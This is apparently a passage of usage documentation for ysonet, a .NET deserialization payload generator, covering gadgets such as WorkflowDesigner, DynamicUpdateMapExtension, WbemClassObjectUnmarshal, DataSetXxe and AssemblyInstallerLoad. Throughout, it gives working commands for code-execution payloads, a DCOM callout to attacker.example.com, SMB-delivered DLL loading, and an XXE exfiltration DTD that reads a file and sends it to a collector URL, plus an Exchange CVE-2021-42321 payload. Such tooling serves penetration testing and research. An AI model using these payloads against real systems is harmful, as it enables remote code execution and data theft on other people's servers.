`WorkflowDesigner` uses
`System.Activities.Presentation.WorkflowDesigner.PropertyInspectorFontAndColorData`,
a public string property with a SETTER AND NO GETTER whose setter runs
`XamlReader.Load` on whatever it is given. So the whole payload is one type name
and one string member, and that string is a XAML document.

```bash
# the default inner document: a Hashtable holding an ObjectDataProvider that runs -c
./ysonet.exe -g WorkflowDesigner -f Json.NET -c "calc.exe"

# same technique through a formatter the old ObjectDataProvider wrapper could not reach
./ysonet.exe -g WorkflowDesigner -f MessagePackTypeless -c "calc.exe" -o base64

# bring your own XAML: any Xaml gadget can be the inner payload
./ysonet.exe -g WorkflowDesigner -bgc ObjectDataProvider -f Json.NET -c "calc.exe"
```

The Json.NET form is two lines:

```json
{
    "$type":"System.Activities.Presentation.WorkflowDesigner, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "PropertyInspectorFontAndColorData":"<the XAML document, escaped for this string>"
}
```

Four things to know:

- WHY IT REACHES EIGHT FORMATTERS WHEN THE MEMBER CANNOT BE READ. That is the
  interesting part, and it cuts the other way from what you would expect. A
  serializer that builds its member list from a read-AND-write contract never sees
  a write-only property: it resolves the type, constructs it, and assigns nothing.
  The eight that work either look the member up by name at assignment time or keep
  a member whose setter exists without a getter. `YamlDotNet` is the one that does
  not, and it says so rather than failing quietly. The runtime formatters
  (BinaryFormatter, SoapFormatter, LosFormatter, FsPickler) are out because the
  type is not `[Serializable]`, and the DataContract family and `XmlSerializer` are
  out because a POCO contract needs read-write members.
- IT IS NOT AN XXE PRIMITIVE. The setter builds its `XmlReader` with
  `XmlResolver = null`, so no DTD or external entity is fetched. What you get is
  XAML OBJECT CONSTRUCTION, which is why the inner payload is a gadget rather than
  a URL.
- THE TARGET NEEDS AN STA THREAD, and `System.Activities.Presentation`. The
  constructor builds WPF objects and creates a `System.Windows.Application` when
  the process has none, so a payload that lands on a plain worker thread throws
  before the member is ever assigned. `-t` handles this for you.
- THE LOADED ROOT SHOULD BE A `Hashtable`. The setter casts the result of
  `XamlReader.Load` to one. The cast runs AFTER the document has been built, so a
  different root still fires and then throws - but the default inner document uses
  a `Hashtable` root so the setter completes cleanly, and a bridged payload can do
  the same if you care about that.

This replaces `ObjectDataProvider --variant 4`, which existed only when the outer
formatter was already Xaml.

### Turn a XAML-only sink into a NetDataContractSerializer sink

`DynamicUpdateMapExtension` is a public `MarkupExtension` in `System.Activities`
whose content property hands its XML straight to
`NetDataContractSerializer.ReadObject`, with no binder and no known-type list. So a
host that only ever parses XAML - `XamlServices.Load`, `ActivityXamlServices.Load`
for a `.xamlx` workflow file, `WorkflowDesigner.Load(fileName)`,
`System.Windows.Markup.XamlReader.Load` - can be given any NDCS gadget in this
tool.

```bash
# the default inner payload: TypeConfuseDelegate through NetDataContractSerializer
./ysonet.exe -g DynamicUpdateMapExtension -f Xaml -c "calc.exe"

# bring your own inner chain: any gadget that supports NetDataContractSerializer
./ysonet.exe -g DynamicUpdateMapExtension -bgc WindowsIdentity -f Xaml -c "calc.exe"

# carry the whole thing through a non-XAML formatter by chaining it as a Xaml inner
./ysonet.exe -g WorkflowDesigner -bgc DynamicUpdateMapExtension -f Json.NET -c "calc.exe"
```

The document is short, and its shape is the whole technique:

```xml
<DynamicUpdateMapExtension xmlns="clr-namespace:System.Activities.XamlIntegration;assembly=System.Activities"
                           xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
  <DynamicUpdateMapExtension.XmlContent>
    <x:XData>
      <!-- the NetDataContractSerializer document, as literal XML -->
    </x:XData>
  </DynamicUpdateMapExtension.XmlContent>
</DynamicUpdateMapExtension>
```

Three things to know:

- THE `<x:XData>` WRAPPER IS LOAD BEARING. The XAML scanner treats markup as
  literal XML only for that one element; the object writer then sees an `XData`
  value on a member whose type is `IXmlSerializable`, reads the property, and calls
  `ReadXml` on what it got back. Nest the inner document directly under
  `<DynamicUpdateMapExtension.XmlContent>` instead and the parser tries to resolve
  its root as a XAML type, failing with "Cannot create unknown type" without ever
  reaching the serializer.
- A FAILED LOAD IS THE NORMAL OUTCOME. `ReadXml` casts the result to
  `DynamicUpdateMap` AFTER `ReadObject` has returned, so the inner chain has already
  run by the time you see the `InvalidCastException`. Do not read that error as "the
  payload did not work".
- XAML IS THE ONLY FORMATTER, because the sink is a XAML parser feature rather than
  a member assignment: no other serializer calls `ReadXml`, `XmlContent` has no
  setter, the type is not `[Serializable]`, and a data contract is built from
  read-write members. To reach it from another format, chain this gadget INTO a
  consumer that takes a Xaml inner payload, as in the third example above.

Where it does NOT land: the restrictive XAML reader behind the CVE-2020-0605/0606
mitigation, which the WPF clipboard and XPS sinks use, drops this payload. Its
five named types (`ObjectDataProvider`, `ResourceDictionary`, `AssemblyInstaller`,
`WorkflowDesigner`, `BindingSource`) look like a blocklist, but the check is really
an ALLOWLIST: it keeps only a `DependencyObject` subclass in the `System.Windows`
namespaces, a primitive, or a type an administrator allowed in the registry, and
silently skips every other subtree - no exception, nothing built, no effect. That
is a property of that one reader; `XamlServices.Load` and
`ActivityXamlServices.Load`, which is where this gadget is aimed, use the default
schema context and are unaffected.

### Make the target call out over DCOM/RPC

`WbemClassObjectUnmarshal` uses
`System.Management.IWbemClassObjectFreeThreaded`, whose serialization constructor
hands one `byte[]` member straight to native `CoUnmarshalInterface`. By default
ysonet builds an `OBJREF_STANDARD` for you from `-c`, naming a host and an object
exporter the target cannot know, so the target has to resolve that host name and
connect to it before it can fail.

```bash
# the target resolves attacker.example.com and connects to it on RPC port 135
./ysonet.exe -g WbemClassObjectUnmarshal -f BinaryFormatter -c "attacker.example.com"

# an IP works, and so does an IPv6 literal
./ysonet.exe -g WbemClassObjectUnmarshal -f Json.NET -c "10.0.0.5"

# ship a blob you built yourself, byte for byte
./ysonet.exe -g WbemClassObjectUnmarshal -f SoapFormatter --variant 2 -c "C:\work\objref.bin"
```

Four things to know:

- YOU DO NOT CHOOSE THE PORT. OXID resolution ignores the endpoint inside an RPC
  string binding and always talks to port 135. So `-c "host:135"` and
  `-c "host[135]"` are refused rather than quietly stripped, because stripping
  them would build a payload that does something other than what you asked for.
  An IPv6 literal like `::1` is still accepted - the rule is "no port", not "no
  colon".
- IT PROVES A CONNECTION, NOT NTLM COERCION. The resolver call is not
  authenticated. Treat a hit as "the target reached me", nothing more.
- The payload always ends in a COM error on the target, and that is normal: the
  callback has already happened by the time it fails. `OR_INVALID_OXID`
  (`0x80070776`) means your host answered; `RPC_S_SERVER_UNAVAILABLE`
  (`0x800706BA`) means nothing answered on port 135. Watch for the DNS lookup if
  outbound 135 is blocked - the name is resolved first either way.
- `-t` works for variant 1, and it means what it means everywhere else: the
  payload is deserialized HERE, so YOUR machine performs the callback. That is
  the quick way to check the payload and your listener. Add `--debugmode` to see
  the COM error it ends with. It is refused for variant 2 only, because that
  would feed your own unparsed bytes to native COM on this machine.

The two variants are not two different effects. Both hand a `byte[]` to
`CoUnmarshalInterface` on the target; they differ only in who writes those bytes.
Variant 1 writes them for you from a host name. Variant 2 reads a file you wrote
yourself (readable, non-empty, up to 1 MiB) and ships it byte for byte.

So variant 2 is an escape hatch, NOT a stronger variant 1 and NOT a
code-execution variant. ysonet does not parse or understand your blob, so the
effect is entirely whatever those bytes mean on the target - which may be
nothing, a callout of your own design, or a crash. It gives you the delivery
channel and nothing else. Use it when you have built a blob variant 1 cannot
express, such as an `OBJREF_CUSTOM`.

Note also that capturing a real marshalled `IWbemClassObject` does NOT give you
variant 1's behaviour: WMI marshals such an object by value as an
`OBJREF_CUSTOM`, which names no host at all.

### Make the target fetch an external DTD (legacy XXE)

`DataViewManagerXxe` sets `System.Data.DataViewManager.DataViewSettingCollectionString`.
That setter parses the value with a legacy `XmlTextReader`, so a DOCTYPE with an
external parameter entity makes the target fetch a URL you choose. `-c` is that
URL.

```bash
# the five formatters that can reach the setter
./ysonet.exe -g DataViewManagerXxe -f Xaml -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataViewManagerXxe -f JavaScriptSerializer -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataViewManagerXxe -f FastJson -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataViewManagerXxe -f SharpSerializerXml -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataViewManagerXxe -f SharpSerializerBinary -c "http://10.0.0.5:8080/x.dtd"
```

Four things to know:

- IT ONLY FIRES ON A TARGET WITH THE OLD XML DEFAULTS. Since .NET Framework
  4.5.2 a legacy `XmlTextReader` is built with no resolver, so nothing is
  fetched. It still fires when the deserializing application TARGETS an earlier
  framework (its `TargetFrameworkAttribute`, not the installed runtime), or when
  the machine sets `EnableLegacyXmlSettings` to 1 under
  `HKLM\SOFTWARE\Microsoft\.NETFramework\XML` or the same key in `HKCU`. Put
  another way: a modern runtime is not a defence on its own, but a modern target
  framework is.
- This is a network effect, not file disclosure. A fetched DTD proves SSRF and
  outbound reachability. The setter reads elements and attributes only, never
  entity text, and returns nothing to you, so it is not a way to read a file off
  the target.
- Only five formatters can carry it, and that is structural rather than
  unfinished work. `DataViewManager` implements `IList`, so a serializer that
  infers a contract (Json.NET, YamlDotNet, DataContractSerializer,
  NetDataContractSerializer, XmlSerializer, DataContractJsonSerializer,
  MessagePack typeless) treats it as a COLLECTION and never calls the property
  setter. BinaryFormatter, SoapFormatter, LosFormatter and FsPickler restore
  fields without calling any setter, and the type is not `[Serializable]` anyway.
- The URL must be http or https and must not contain a double quote, `<`, `>`,
  a backslash, whitespace or a control character, because it is placed inside a
  quoted DTD external identifier. Percent-encode anything else. Query strings
  are fine: `&` and `%` are literal there. `--rawinput` skips that check for
  research on a resolver that accepts something else; it does NOT turn off the
  escaping that keeps the outer payload a valid document.

### Reach the same XML gate through a DataSet, and read a file back

`DataSetXxe` is the other half of the same story. `System.Data.DataSet` is
`ISerializable`, and its deserialization constructor hands the `XmlSchema` member
to the same kind of legacy `XmlTextReader`. So the gate is identical, but the
carrier and the formatters are the opposite ones: `DataViewManagerXxe` needs a
serializer that calls a property SETTER, and `DataSetXxe` needs one that invokes
the serialization CONSTRUCTOR.

Variant 1 is the same single fetch, on five different formatters:

```bash
./ysonet.exe -g DataSetXxe -f BinaryFormatter -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataSetXxe -f SoapFormatter   -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataSetXxe -f LosFormatter    -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataSetXxe -f Json.NET        -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataSetXxe -f FsPickler       -c "http://10.0.0.5:8080/x.dtd"
```

Variant 2 goes further and actually reads a file off the target. It needs a host
you control and produces TWO artifacts: the payload, and a DTD you have to
publish. `-c` is the BASE URL of your host, `--file` is what to read on the target
(usually a `file:` URI), and `--dtd-out` is where ysonet writes the DTD for you.

```bash
./ysonet.exe -g DataSetXxe -f BinaryFormatter --variant 2 \
  -c "http://10.0.0.5:8080/" \
  --file "file:///C:/Windows/system.ini" \
  --dtd-out ./dataset-oob.dtd \
  -o base64
```

Then publish `dataset-oob.dtd` at `http://10.0.0.5:8080/dataset-oob.dtd` and watch
`http://10.0.0.5:8080/collect`. The DTD ysonet writes is readable on purpose:

```text
<!ENTITY % file SYSTEM "file:///C:/Windows/system.ini">
<!ENTITY % build "<!ENTITY &#x25; exfil SYSTEM 'http://10.0.0.5:8080/collect?d=%file;'>">
%build;
%exfil;
```

The target fetches the DTD, `%file;` reads the file, `%build;` declares `%exfil;`
with the content already substituted into the URL, and referencing `%exfil;` sends
it. The file arrives in the `d=` query string of the request to `/collect`.

What to expect from variant 2:

- The same pre-4.5.2 XML gate applies. Nothing at all happens on a target with
  the modern defaults.
- WHAT COMES BACK, measured rather than assumed. Spaces, line breaks, `<`, `>`
  and `"` all arrive percent-encoded and decode cleanly, and size is not the
  limit (4 KB came back intact; the reader's own entity budget is 10,000,000
  characters). But any of `&`, `%`, `'` or `#` anywhere in the file BREAKS the
  chain and you get no second request at all: the first three end a construct
  inside the DTD, and the last starts a URI fragment. That is why a short `.ini`
  style file comes back whole and a config file full of entity references or
  apostrophes does not.
- Neither `-c` nor `--file` is validated in variant 2. What counts as a system
  identifier is the TARGET parser's decision, so a bare Windows path, a UNC path,
  a non-http host for the DTD, or a base URL that already carries a query string
  all go through exactly as typed. Only a double quote really breaks the DTD,
  because it ends the quoted identifier the value sits in; `%` and `&` are literal
  there, so `file:///C:/Program%20Files/x.txt` is the right way to write a space.
  (Variant 1 still checks its `-c` and still has `--rawinput` to skip that.)
- `--dtd-out` is taken at face value. A file already there is REPLACED and a
  missing folder is created, so generating twice to the same path works, and
  ysonet says on stderr when it replaced something. ysonet writes UTF-8 with no
  BOM. The DTD is written only after the payload is built, so a run that fails
  leaves whatever is at that path untouched.
- Nothing on YOUR machine is opened. `--file` is a path on the target; it is
  written into the hosted DTD as text and is never resolved while building.
- Variant 1 refuses `--file` and `--dtd-out` instead of ignoring them, so a
  forgotten `--variant 2` is an error rather than a payload that discloses
  nothing.

### Make the target load your own installer DLL and run it

`AssemblyInstallerLoad` is a bring-your-own-DLL gadget. Setting
`System.Configuration.Install.AssemblyInstaller.Path` makes the target call
`Assembly.LoadFrom` on the path you give it, and reading `HelpText` afterwards makes it
build every public, non-abstract `System.Configuration.Install.Installer` subclass in
that assembly that is marked `[RunInstaller(true)]`. Your installer's CONSTRUCTOR is
what runs. ysonet never produces the DLL.

Your DLL needs a class like this, and nothing else:

```csharp
using System.ComponentModel;
using System.Configuration.Install;

[RunInstaller(true)]
public class Boom : Installer
{
    public Boom() { /* your code here */ }
}
```

```bash
# variant 1: a path the target can already open
./ysonet.exe -g AssemblyInstallerLoad -f Json.NET -c "C:\programdata\installer.dll"

# variant 2: the target fetches it from your share over SMB
./ysonet.exe -g AssemblyInstallerLoad -f Json.NET --variant 2 -c "\\10.0.0.5\share\installer.dll"

# the other formatters (PropertyGrid carrier only)
./ysonet.exe -g AssemblyInstallerLoad -f Xaml -c "C:\programdata\installer.dll"
./ysonet.exe -g AssemblyInstallerLoad -f FastJson -c "C:\programdata\installer.dll"
./ysonet.exe -g AssemblyInstallerLoad -f JavaScriptSerializer -c "C:\programdata\installer.dll"
./ysonet.exe -g AssemblyInstallerLoad -f YamlDotNet -c "C:\programdata\installer.dll"
./ysonet.exe -g AssemblyInstallerLoad -f SharpSerializerXml -c "C:\programdata\installer.dll"
./ysonet.exe -g AssemblyInstallerLoad -f SharpSerializerBinary -c "C:\programdata\installer.dll"
./ysonet.exe -g AssemblyInstallerLoad -f MessagePackTypeless -c "C:\programdata\installer.dll"

# a different getter carrier (Json.NET and Xaml only)
./ysonet.exe -g AssemblyInstallerLoad -f Xaml --getter 3 -c "C:\programdata\installer.dll"
```

Things to know:

- `-t` IS A SELF-EXPLOIT and is accepted: it deserializes the payload in the ysonet
  process, which loads your DLL and runs its installer constructors on YOUR machine
  - the same self-run `-t` performs for every other gadget. Only `-t` a DLL you
  trust; to hit the target instead, generate and deliver the payload.
- Without a `[RunInstaller(true)]` installer class, the payload is only an assembly
  load. That is still useful (a module initializer or a static constructor may run),
  but it is not the same thing.
- `-c` must be a PATH to a `.dll` or a managed `.exe`. A bare program name such as
  `calc.exe` is refused, because it would be resolved against whatever directory the
  target process happens to be in.
- UNC delivery is configuration dependent. .NET only loads an assembly from a share
  it classifies as Local Intranet; a share reached by a bare IP is Internet zone and
  the load fails with `0x80131515` unless the target sets `loadFromRemoteSources=true`.
  The target must also be able to reach the share at all: SMB egress, share
  permissions, and Mark-of-the-Web all apply. A DNS or SMB callback proves the target
  TRIED, not that it loaded the assembly.
- `--getter` picks the WinForms carrier that reads `HelpText`. Only Json.NET and Xaml
  can build the ComboBox, ListBox and CheckedListBox carriers, because those expose
  `Items` without a setter; every other formatter uses `--getter 1` (PropertyGrid).
  ComboBox reads `HelpText` more than once, but your installer is still constructed
  only once: `AssemblyInstaller` sets a private `initialized` flag after the first read.
- Not the same gadget as `XamlAssemblyLoadFromFile`, which takes C# SOURCE, compiles it
  while building and embeds the assembly in the payload (and needs WPF on the target).
  This one takes a path to an assembly you already have, and can deliver it over SMB.
- If `--minify` would rewrite your path (the YAML minifier collapses repeated spaces,
  the XML one collapses `"; "`), generation is refused rather than shipping a payload
  that names a different file. Drop `--minify` or use a simpler path.

### Generate a minified BinaryFormatter payload for Exchange CVE-2021-42321

Uses the ActivitySurrogateDisableTypeCheck gadget inside the ClaimsPrincipal gadget.

```bash
./ysonet.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateDisableTypeCheck --minify --ust
```
